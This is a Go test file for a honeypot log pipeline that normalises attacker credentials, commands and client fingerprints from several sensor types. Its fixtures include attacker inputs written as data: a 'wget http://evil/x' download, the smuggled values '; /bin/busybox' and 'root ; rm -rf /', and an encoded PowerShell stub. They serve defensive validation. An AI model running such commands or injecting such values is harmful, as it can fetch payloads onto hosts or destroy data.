package main

import "testing"

func TestPromoteCowrieFieldsCredsOnLogin(t *testing.T) {
	e := map[string]any{"eventid": "cowrie.login.failed", "username": "root", "password": "arris"}
	if !promoteCowrieFields(e) {
		t.Fatal("expected a change")
	}
	if e["canonical_user"] != "root" || e["canonical_pass"] != "arris" {
		t.Fatalf("got user=%v pass=%v", e["canonical_user"], e["canonical_pass"])
	}
}

func TestPromoteCowrieFieldsRejectsInvalidCredentialPair(t *testing.T) {
	// A command-injection-looking password must not be promoted, matching
	// dashboard/aggregate.go's own validCredentialPair gate on TopCreds.
	e := map[string]any{"eventid": "cowrie.login.failed", "username": "root", "password": "; /bin/busybox"}
	if promoteCowrieFields(e) {
		t.Fatalf("expected no change for an invalid credential pair, got %+v", e)
	}
	if _, ok := e["canonical_user"]; ok {
		t.Fatalf("canonical_user should not be set: %+v", e)
	}
}

func TestPromoteCowrieFieldsLoginWithPubkeyFingerprint(t *testing.T) {
	e := map[string]any{"eventid": "cowrie.login.success", "username": "root", "password": "", "fingerprint": "aa:bb:cc"}
	if !promoteCowrieFields(e) {
		t.Fatal("expected a change")
	}
	if e["canonical_fingerprint"] != "aa:bb:cc" || e["canonical_fingerprint_kind"] != "SSH pubkey" {
		t.Fatalf("got %+v", e)
	}
	// user/pass alone ("root"/"") fails validCredentialPair (empty pass is
	// fine, but let's confirm creds aren't force-set when password is
	// legitimately empty for a pubkey-only attempt with no password field).
	if _, ok := e["canonical_user"]; !ok {
		t.Fatalf("expected canonical_user to still be set for a non-empty username: %+v", e)
	}
}

func TestPromoteCowrieFieldsCommand(t *testing.T) {
	e := map[string]any{"eventid": "cowrie.command.input", "input": "wget http://evil/x"}
	if !promoteCowrieFields(e) {
		t.Fatal("expected a change")
	}
	if e["canonical_command"] != "wget http://evil/x" {
		t.Fatalf("got %v", e["canonical_command"])
	}
}

func TestPromoteCowrieFieldsClientVersionAndKex(t *testing.T) {
	e := map[string]any{"eventid": "cowrie.client.version", "version": "SSH-2.0-libssh2"}
	if !promoteCowrieFields(e) {
		t.Fatal("expected a change")
	}
	if e["canonical_client_version"] != "SSH-2.0-libssh2" {
		t.Fatalf("got %v", e["canonical_client_version"])
	}
	if e["canonical_fingerprint"] != "SSH-2.0-libssh2" || e["canonical_fingerprint_kind"] != "SSH client" {
		t.Fatalf("got %+v", e)
	}

	e2 := map[string]any{"eventid": "cowrie.client.kex", "hassh": "deadbeef"}
	if !promoteCowrieFields(e2) {
		t.Fatal("expected a change")
	}
	if e2["canonical_fingerprint"] != "deadbeef" || e2["canonical_fingerprint_kind"] != "HASSH" {
		t.Fatalf("got %+v", e2)
	}
}

func TestPromoteCowrieFieldsShasum(t *testing.T) {
	e := map[string]any{"eventid": "cowrie.session.file_download", "shasum": "abc123"}
	if !promoteCowrieFields(e) {
		t.Fatal("expected a change")
	}
	if e["canonical_shasum"] != "abc123" {
		t.Fatalf("got %v", e["canonical_shasum"])
	}
}

func TestPromoteCowrieFieldsIgnoresNonCowrieAndUncasedEvents(t *testing.T) {
	if promoteCowrieFields(map[string]any{"eventid": "dionaea.connection.tcp.accept"}) {
		t.Fatal("expected no change for a non-cowrie eventid")
	}
	if promoteCowrieFields(map[string]any{"eventid": "cowrie.session.connect"}) {
		t.Fatal("expected no change for a cowrie eventid with no canonical field")
	}
}

func TestPromoteDionaeaFieldsCredentials(t *testing.T) {
	e := map[string]any{
		"credentials": []any{map[string]any{"username": "admin", "password": "admin"}},
	}
	if !promoteDionaeaFields(e) {
		t.Fatal("expected a change")
	}
	if e["canonical_user"] != "admin" || e["canonical_pass"] != "admin" {
		t.Fatalf("got %+v", e)
	}
}

func TestPromoteDionaeaFieldsNoCredentials(t *testing.T) {
	e := map[string]any{"connection": map[string]any{"protocol": "smbd"}}
	if promoteDionaeaFields(e) {
		t.Fatalf("expected no change: %+v", e)
	}
}

func TestPromoteDionaeaIncidentFieldsLoginCreds(t *testing.T) {
	e := map[string]any{
		"origin": "dionaea.ftp.login",
		"data":   map[string]any{"username": "anon", "password": "guest"},
	}
	if !promoteDionaeaIncidentFields(e) {
		t.Fatal("expected a change")
	}
	if e["canonical_user"] != "anon" || e["canonical_pass"] != "guest" {
		t.Fatalf("got %+v", e)
	}
}

func TestPromoteDionaeaIncidentFieldsNonLoginKindSkipsCreds(t *testing.T) {
	// Same shape as a login incident but the origin kind carries neither
	// "login" nor "auth" -- must not be promoted as a credential pair.
	e := map[string]any{
		"origin": "dionaea.connection.tcp.accept",
		"data":   map[string]any{"username": "anon", "password": "guest"},
	}
	if promoteDionaeaIncidentFields(e) {
		t.Fatalf("expected no change: %+v", e)
	}
}

func TestPromoteDionaeaIncidentFieldsShasumDirect(t *testing.T) {
	e := map[string]any{
		"origin": "dionaea.download.complete.unique",
		"data":   map[string]any{"sha256": "deadbeef"},
	}
	if !promoteDionaeaIncidentFields(e) {
		t.Fatal("expected a change")
	}
	if e["canonical_shasum"] != "deadbeef" {
		t.Fatalf("got %v", e["canonical_shasum"])
	}
}

func TestPromoteDionaeaIncidentFieldsShasumFromDownloadBasename(t *testing.T) {
	hash := "0123456789abcdef0123456789abcdef01234567"
	e := map[string]any{
		"origin": "dionaea.download.complete.unique",
		"data":   map[string]any{"url": "http://x/" + hash},
	}
	if !promoteDionaeaIncidentFields(e) {
		t.Fatal("expected a change")
	}
	if e["canonical_shasum"] != hash {
		t.Fatalf("got %v", e["canonical_shasum"])
	}
}

func TestPromoteDionaeaIncidentFieldsNonDionaeaOriginSkipped(t *testing.T) {
	e := map[string]any{"origin": "other.thing", "data": map[string]any{"sha256": "deadbeef"}}
	if promoteDionaeaIncidentFields(e) {
		t.Fatalf("expected no change: %+v", e)
	}
}

func TestPromoteCiscoAsaFieldsCommandAndFingerprint(t *testing.T) {
	e := map[string]any{
		"event":   "post",
		"data":    "user=admin&pass=admin",
		"headers": map[string]any{"User-Agent": "curl/8.0", "X-JA4": "t13d..."},
	}
	if !promoteCiscoAsaFields(e) {
		t.Fatal("expected a change")
	}
	if e["canonical_command"] != "user=admin&pass=admin" {
		t.Fatalf("got %v", e["canonical_command"])
	}
	// JA4 takes priority over User-Agent when both are present.
	if e["canonical_fingerprint"] != "t13d..." || e["canonical_fingerprint_kind"] != "JA4" {
		t.Fatalf("got %+v", e)
	}
}

func TestPromoteCiscoAsaFieldsUserAgentFallback(t *testing.T) {
	e := map[string]any{"event": "get", "headers": map[string]any{"User-Agent": "curl/8.0"}}
	if !promoteCiscoAsaFields(e) {
		t.Fatal("expected a change")
	}
	if e["canonical_fingerprint"] != "curl/8.0" || e["canonical_fingerprint_kind"] != "User-Agent" {
		t.Fatalf("got %+v", e)
	}
}

func TestPromoteCiscoAsaFieldsNoHeadersNoCommand(t *testing.T) {
	e := map[string]any{"event": "https_listening"}
	if promoteCiscoAsaFields(e) {
		t.Fatalf("expected no change: %+v", e)
	}
}

func TestPromoteCanonicalFieldsDispatchesByPersona(t *testing.T) {
	cases := []struct {
		persona string
		e       map[string]any
		want    bool
	}{
		{"cowrie", map[string]any{"eventid": "cowrie.command.input", "input": "id"}, true},
		{"dionaea", map[string]any{"credentials": []any{map[string]any{"username": "a", "password": "b"}}}, true},
		{"dionaea-incident", map[string]any{"origin": "dionaea.ftp.login", "data": map[string]any{"username": "a", "password": "b"}}, true},
		{"cisco-asa-honeypot", map[string]any{"event": "post", "data": "x"}, true},
		{"dns-honeypot", map[string]any{"event": "query", "query": "example.com"}, false},
		{"conpot", map[string]any{"data_type": "modbus", "request": "\x00\x01"}, false},
		{"unknown-sensor", map[string]any{"eventid": "cowrie.login.success", "username": "a", "password": "b"}, false},
	}
	for _, tc := range cases {
		got := promoteCanonicalFields(tc.persona, tc.e)
		if got != tc.want {
			t.Errorf("promoteCanonicalFields(%q, %+v) = %v, want %v", tc.persona, tc.e, got, tc.want)
		}
	}
}

// #1217 -- field shapes below are ported directly from real live records
// (homeserver, 2026-08-12), not invented.

func TestPromoteMultipotFieldsLoginCreds(t *testing.T) {
	e := map[string]any{"sensor": "multipot", "proto": "smtp", "event": "login", "username": "dvr@mail01.nexusai.local", "password": "123456789"}
	if !promoteMultipotFields(e) {
		t.Fatal("expected a change")
	}
	if e["canonical_user"] != "dvr@mail01.nexusai.local" || e["canonical_pass"] != "123456789" {
		t.Fatalf("got %+v", e)
	}
}

func TestPromoteMultipotFieldsIgnoresNonMultipotSensor(t *testing.T) {
	e := map[string]any{"sensor": "dns-honeypot", "event": "login", "username": "a", "password": "b"}
	if promoteMultipotFields(e) {
		t.Fatalf("expected no change for a non-multipot record: %+v", e)
	}
}

func TestPromoteMultipotFieldsCommand(t *testing.T) {
	e := map[string]any{"sensor": "multipot", "proto": "socks5", "event": "command", "command": "CONNECT 10.0.0.1:80"}
	if !promoteMultipotFields(e) {
		t.Fatal("expected a change")
	}
	if e["canonical_command"] != "CONNECT 10.0.0.1:80" {
		t.Fatalf("got %v", e["canonical_command"])
	}
}

func TestPromoteMultipotFieldsSkipsHTTPRequestCommand(t *testing.T) {
	// #41: http_request's own "command" is an HTTP request line, not an
	// attacker command -- must not pollute canonical_command.
	e := map[string]any{"sensor": "multipot", "event": "http_request", "command": "GET /_search HTTP/1.1"}
	if promoteMultipotFields(e) {
		t.Fatalf("expected no change for an http_request event: %+v", e)
	}
}

func TestPromoteMultipotFieldsClientBannerFingerprint(t *testing.T) {
	e := map[string]any{"sensor": "multipot", "event": "connect", "client": "libssh2_1.0"}
	if !promoteMultipotFields(e) {
		t.Fatal("expected a change")
	}
	if e["canonical_fingerprint"] != "libssh2_1.0" || e["canonical_fingerprint_kind"] != "client banner" {
		t.Fatalf("got %+v", e)
	}
}

func TestPromoteCitrixFieldsPayloadAndFingerprint(t *testing.T) {
	e := map[string]any{
		"sensor": "citrix-honeypot", "event": "get", "path": "/",
		"headers": map[string]any{"User-Agent": "Mozilla/5.0 zgrab/0.x", "x-ja3": "cba7f3", "x-ja4": "t12i13"},
	}
	if !promoteCitrixFields(e) {
		t.Fatal("expected a change")
	}
	if e["canonical_fingerprint"] != "t12i13" || e["canonical_fingerprint_kind"] != "JA4" {
		t.Fatalf("expected JA4 to win over JA3/User-Agent: %+v", e)
	}
}

func TestPromoteCitrixFieldsCVEPayload(t *testing.T) {
	e := map[string]any{"sensor": "citrix-honeypot", "event": "cve_2019_19781_payload", "data": "id"}
	if !promoteCitrixFields(e) {
		t.Fatal("expected a change")
	}
	if e["canonical_command"] != "id" {
		t.Fatalf("got %v", e["canonical_command"])
	}
}

func TestPromoteRDPFieldsUsernameOnly(t *testing.T) {
	e := map[string]any{"sensor": "rdp-honeypot", "event": "connect", "username": "Test"}
	if !promoteRDPFields(e) {
		t.Fatal("expected a change")
	}
	if e["canonical_user"] != "Test" || e["canonical_pass"] != "" {
		t.Fatalf("got %+v", e)
	}
}

func TestPromoteRDPFieldsNoUsernameNoChange(t *testing.T) {
	e := map[string]any{"sensor": "rdp-honeypot", "event": "listening"}
	if promoteRDPFields(e) {
		t.Fatalf("expected no change: %+v", e)
	}
}

func TestPromoteWebRequestFieldsCredsAndFingerprint(t *testing.T) {
	e := map[string]any{
		"sensor": "http-honeypot", "method": "GET", "path": "/admin", "username": "admin", "password": "admin123",
		"headers": map[string]any{"User-Agent": "curl/8.0"},
	}
	if !promoteWebRequestFields("http-honeypot", e) {
		t.Fatal("expected a change")
	}
	if e["canonical_user"] != "admin" || e["canonical_pass"] != "admin123" {
		t.Fatalf("got %+v", e)
	}
	if e["canonical_fingerprint"] != "curl/8.0" || e["canonical_fingerprint_kind"] != "User-Agent" {
		t.Fatalf("got %+v", e)
	}
}

func TestPromoteWebRequestFieldsSkipsStartupCategory(t *testing.T) {
	e := map[string]any{"category": "startup"}
	if promoteWebRequestFields("tanner", e) {
		t.Fatalf("expected no change for a startup record: %+v", e)
	}
}

func TestPromoteWebRequestFieldsSkipsLegacyPeerShape(t *testing.T) {
	// No "method" or "category" field -- the legacy tanner peer-shape
	// report, which carries no creds/fingerprint/command to promote.
	e := map[string]any{"peer": map[string]any{"ip": "10.8.0.2"}, "paths": []any{}}
	if promoteWebRequestFields("tanner", e) {
		t.Fatalf("expected no change for the legacy peer shape: %+v", e)
	}
}

func TestPromoteWebRequestFieldsTannerPostDataBecomesCanonicalCommand(t *testing.T) {
	e := map[string]any{"method": "POST", "path": "/login", "post_data": map[string]any{"password": "toor", "username": "root"}}
	if !promoteWebRequestFields("tanner", e) {
		t.Fatal("expected a change")
	}
	if e["canonical_command"] != "password=toor&username=root" {
		t.Fatalf("got %v (expected sorted key order for determinism)", e["canonical_command"])
	}
}

func TestPromoteWebRequestFieldsHTTPHoneypotIgnoresPostData(t *testing.T) {
	// Parity with classify.go: post_data is only ever read for tanner, not
	// http-honeypot -- its own POST body was never promoted into
	// TopCommands by the dashboard either.
	e := map[string]any{"method": "POST", "path": "/login", "post_data": map[string]any{"a": "b"}}
	if promoteWebRequestFields("http-honeypot", e) {
		t.Fatalf("expected no change for http-honeypot's post_data: %+v", e)
	}
}

func TestValidCredentialPairMatchesDashboardBehavior(t *testing.T) {
	cases := []struct {
		user, pass string
		want       bool
	}{
		{"", "", false},
		{"root", "toor", true},
		{"root", "; /bin/busybox", false},
		{"root ; rm -rf /", "x", false},
		{"root", "powershell -enc ...", false},
	}
	for _, tc := range cases {
		if got := validCredentialPair(tc.user, tc.pass); got != tc.want {
			t.Errorf("validCredentialPair(%q, %q) = %v, want %v", tc.user, tc.pass, got, tc.want)
		}
	}
}
